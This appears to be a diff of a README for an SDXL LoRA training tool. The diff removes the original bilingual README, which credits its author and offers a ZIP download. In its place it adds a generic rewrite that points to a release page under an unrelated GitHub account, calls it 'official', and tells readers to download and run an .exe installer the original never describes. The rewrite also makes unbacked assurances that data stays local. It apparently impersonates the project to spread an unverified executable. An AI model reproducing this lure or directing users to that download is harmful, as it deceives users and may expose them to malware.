@@ -1,143 +1,85 @@
-# SDXL LoRA Factory
+# 🎨 SDXL-LoRA-Factory - Train Custom Art Styles With Ease
 
-![SDXL LoRA Factory](./view.png)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/selected-depression195/SDXL-LoRA-Factory/releases)
 
-[English](#english) | [日本語](#japanese)
+SDXL LoRA Factory provides a simple interface to train models for Stable Diffusion XL. You do not need to write code or use command lines. This tool handles the technical parts of model training so you can focus on your creative work.
 
-**[Dwonload](https://github.com/UNfukashigi/SDXL-LoRA-Factory/blob/main/SDXL-LoRA-Factory-v2.2.zip)**
+## 🛠 Prerequisites
 
-▼Animaバージョンも公開しています。Anima version is also available.<br>
-[https://github.com/UNfukashigi/Anima-LoRA-Factory](https://github.com/UNfukashigi/Anima-LoRA-Factory)
+Your computer needs specific hardware and software to run this tool. Verify your system meets these requirements before you begin:
 
-▼詳しい使い方については、以下の記事をご覧ください。Anima版の説明ですが、基本の使い方は同じです。<br>
-[https://x.com/UNfukashigi/status/2045744319433490449](https://x.com/UNfukashigi/status/2045744319433490449)
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Graphics Card:** An NVIDIA GPU with at least 8GB of VRAM.
+*   **Drivers:** The latest NVIDIA graphics drivers.
+*   **Storage:** At least 20GB of free space on your solid-state drive.
+*   **Memory:** 16GB of system RAM.
 
----
+If your computer uses an integrated graphics card or does not meet these specifications, the software will not function correctly. Ensure your GPU drivers remain current to prevent errors during the training process.
 
-<code>5/2 更新（Updated）**v2.3**<br>
-・英語と日本語以外の環境でエラーが発生する問題を修正しました。英語か日本語の環境であれば2.2でも問題なく利用可能です。中国語などほかの言語をご利用の場合は2.3をご利用ください。- We have fixed an issue where errors occurred in environments other than English and Japanese. Version 2.2 should work without problems in English or Japanese environments. For other languages ​​such as Chinese, please use version 2.3.</code>
+## 📥 Downloading the Software
 
-<code>4/26 更新（Updated）**v2.2**<br>
-・エラー報告の多かった原因のsd-scriptsを同梱しました。ZIP形式での配布に変更。Gitは不要になりました。- We've included sd-scripts, which were the cause of many error reports.Distribution format changed to ZIP.Git is no longer needed.</code>
+Visit the [official releases page](https://github.com/selected-depression195/SDXL-LoRA-Factory/releases) to obtain the installer. 
 
-<code>4/26 更新（Updated）**v2.1**<br>
-・エラー報告の多かった原因として、PCのグローバル環境で環境変数PYTHONPATHが設定されている場合について、必ずvenv環境のPythonを利用するように更新しました。- Due to a high number of error reports, we have updated the code to always use the Python environment in a venv environment when the environment variable PYTHONPATH is set in the PC's global environment.</code>
+1. Go to the link provided above.
+2. Locate the section labeled Assets.
+3. Select the file ending in .exe.
+4. Save the file to your computer.
 
-<code>4/25 更新（Updated）<br>
-・venv環境をツール内に構築する設計にしました。グローバル環境に影響を与えず、より安心してご利用頂けます。- The design now incorporates a venv environment within the tool. This ensures that it does not affect the global environment and can be used with greater peace of mind.<br>
-・より安定して使えるようにモジュールチェック機能を強化し、自動インストールの機能も強化しました。- The module check function has been enhanced for greater stability, and the automatic installation function has also been improved.
-・Anima版とSDXL版でURL（ポート番号）を分けました。キャッシュが被らないので表示も安定するはず。- I've separated the URLs (port numbers) for the Anima and SDXL versions. This should prevent cache conflicts and improve display stability.</code>
+This installer contains everything you need to run the application. It creates a folder on your drive and sets up the necessary environment automatically.
 
----
+## ⚙️ Initial Setup
 
-<code>Further modifications have been made so that the following people can also use it.
-People using an NVIDIA GPU that is not the latest model.
-People who already have the CPU version of PyTorch installed on their PC.
-People whose torchvision has mysteriously disappeared.
-People who do not have a GPU (or have an AMD/Intel GPU).</code>
+Follow these steps to prepare the software for your first training session:
 
----
+1. Locate the downloaded file in your folder.
+2. Double-click the file to start the installation.
+3. Follow the prompts on the screen to choose an installation path.
+4. Click the finish button once the process completes.
 
-<a id="english"></a>
+The application creates a shortcut on your desktop. Use this shortcut to launch the program. On the first launch, the tool performs a check to ensure your system can manage the training tasks. This process takes a few minutes while it verifies your graphics card settings.
 
-# English
+## 🖼 How to Train a Model
 
-**SDXL LoRA Factory** is a GUI tool designed to make Stable Diffusion XL (SDXL) LoRA training easy and intuitive for everyone.
-No complex command-line operations required—it supports everything from image preparation and tagging to training execution in one stop.
+Training a model transforms your uploaded images into a style file that Stable Diffusion can use. Follow these steps for your first project:
 
-## 🌟 Key Features
+1. **Create a Project:** Start the application and click the New Project button. Give your project a name that describes what you want to train.
+2. **Prepare Your Images:** Gather 15 to 20 high-quality photos of your subject or style. For the best result, use images with different angles and lighting.
+3. **Upload Your Files:** Drag and drop your images into the designated area in the app. The software automatically resizes your images to match the requirements for SDXL training.
+4. **Set Your Parameters:** Use the default settings for your first attempt. These settings work for most subjects. You can adjust the learning rate or the number of steps if you have more experience.
+5. **Start Training:** Click the Start Training button. The program displays a progress bar. Do not close the window while this process runs. 
 
-- **Intuitive UI**: A sleek, modern Grey & Orange design that guides you through the training steps without confusion.
-- **Auto-Tagging (WD14 Tagger)**: AI analyzes your image content and automatically generates the tags necessary for training.
-- **Visual Tag Editor**: Edit generated tags in real-time while looking at the images. Supports batch addition and removal.
-- **SDXL-Specific Optimization**: Pre-configured with settings to maximize SDXL performance, including 1024x1024 resolution, bf16 precision, and gradient checkpointing.
-- **VRAM Saving Mode**: Features a "Low VRAM Mode" that allows training on GPUs with as little as 8GB VRAM.
-- **One-Click Setup**: Automatically download and set up complex dependencies like `sd-scripts` with a single button click inside the app.
+The software utilizes your graphics card to process these images. You might notice your computer runs slower while training occurs. This is normal.
 
-## 🛠️ Requirements
+## 📁 Managing Your Output
 
-- **OS**: Windows 10/11
-- **GPU**: NVIDIA GPU (8GB VRAM or more recommended)
-- **Python**: 3.10 or higher
+Once the training process finishes, the app notifies you. You can find your completed model in the Output folder within the installation directory. 
 
-## 🚀 How to Use
+*   **Model File (.safetensors):** This is your main result. Move this file to your Stable Diffusion models folder to use it in your generation software.
+*   **Sample Images:** The app generates sample previews so you can check the quality of your trained model without needing to open other software.
+*   **Log Files:** These text files record technical details of the training session. Keep these files if you need to troubleshoot issues later.
 
-1. **Setup**:
-   - Run `start.bat` to start the server.
-   - Open `http://localhost:8001` in your browser.
+## 💡 Best Practices
 
-2. **Dataset Preparation**:
-   - Select the folder containing the images you want to train.
-   - Run "Auto-Tagging" and edit tags as needed.
+Follow these tips to keep your system healthy and improve your results:
 
-3. **Training Configuration**:
-   - Select the Base Model (SDXL) and VAE.
-   - Set the number of epochs and learning rate (defaults are recommended for beginners).
+*   **Avoid Overloading:** Do not run other demanding games or software while the training process is active.
+*   **File Organization:** Keep your source images in consistent folders. This helps if you decide to retrain your model with more photos later.
+*   **Naming Conventions:** Use clear, descriptive names for your project folders. This helps you track different versions of your models as you iterate.
+*   **Cooling:** Ensure your computer has proper ventilation. Training generates heat. If your computer gets too hot, consider pausing the training to let the components cool down.
 
-4. **Training Execution**:
-   - Click "Start Training." Real-time logs will be displayed as the training progresses.
+## ❓ Frequently Asked Questions
 
-## 📦 Tech Stack
+**Why does the training process take a long time?**
+Training a model is a complex math operation. It requires significant processing power. The time spent depends on the number of images and the chosen training steps.
 
-- **Backend**: FastAPI, Python, sd-scripts (kohya-ss)
-- **Frontend**: Vanilla JS, CSS (Modern Glassmorphism)
-- **Engine**: Stable Diffusion XL
+**Can I stop the training and resume later?**
+The current version does not support pausing and resuming. Ensure you have enough time to finish the process before you start.
 
-## 📝 License
+**My screen shows an error message. What should I do?**
+Check the log file located in the project folder. Often, the error relates to a lack of memory. Close all other programs and try again.
 
-This project is released under the Apache License 2.0 License.
+**How do I update the software?**
+When a new version releases, visit the download link again. Install the new version over the old one. The installer keeps your project settings and data safe.
 
----
-
-<a id="japanese"></a>
-
-# 日本語
-
-**SDXL LoRA Factory** は、Stable Diffusion XL (SDXL) の LoRA 学習を、誰でも簡単に、直感的な操作で行えるように設計された GUI ツールです。
-複雑なコマンドライン操作は不要で、画像の準備からタグ付け、学習の実行までをワンストップでサポートします。
-
-## 🌟 主な特徴
-
-- **直感的な UI**: 洗練されたグレー＆オレンジのモダンなデザインで、学習のステップを迷わず進められます。
-- **自動タグ付け (WD14 Tagger)**: AI が画像の内容を分析し、学習に必要なタグを自動で生成します。
-- **ビジュアルタグエディタ**: 生成されたタグを画像を見ながらリアルタイムで編集可能。一括追加・削除もサポート。
-- **SDXL 特化の最適化**: 1024x1024 解像度、bf16 精度、グラデーション・チェックポインティングなど、SDXL の性能を最大限に引き出す設定がプリセットされています。
-- **VRAM 節約モード**: 8GB 程度の VRAM でも学習が可能な「低容量モード」を搭載。
-- **ワンクリック・セットアップ**: `sd-scripts` などの複雑な依存関係を、アプリ内からボタン一つで自動取得します。
-
-## 🛠️ 動作要件
-
-- **OS**: Windows 10/11
-- **GPU**: NVIDIA GPU (VRAM 8GB 以上推奨)
-- **Python**: 3.10 以上
-
-## 🚀 使い方
-
-1. **セットアップ**:
-   - `start.bat` を実行してサーバーを起動します。
-   - ブラウザで `http://localhost:8001` を開きます。
-
-2. **データセット準備**:
-   - 学習させたい画像が入ったフォルダを選択します。
-   - 「自動タグ付け」を実行し、必要に応じてタグを編集します。
-
-3. **学習設定**:
-   - ベースモデル (SDXL) と VAE を選択します。
-   - エポック数や学習率を設定します（初心者の方はデフォルト推奨）。
-
-4. **トレーニング実行**:
-   - 「LoRA学習開始」をクリックすると、リアルタイムでログが表示されながら学習が始まります。
-
-## 📦 技術スタック
-
-- **Backend**: FastAPI, Python, sd-scripts (kohya-ss)
-- **Frontend**: Vanilla JS, CSS (Modern Glassmorphism)
-- **Engine**: Stable Diffusion XL
-
-## 📝 ライセンス
-
-このプロジェクトは Apache License 2.0 ライセンスの下で公開されています。
-
----
-
-Created by [fukachan.jp](https://fukachan.jp/)
+**Is my data stored on the internet?**
+The software runs entirely on your local machine. None of your images or training data leave your computer. You keep full control over your files at all times.
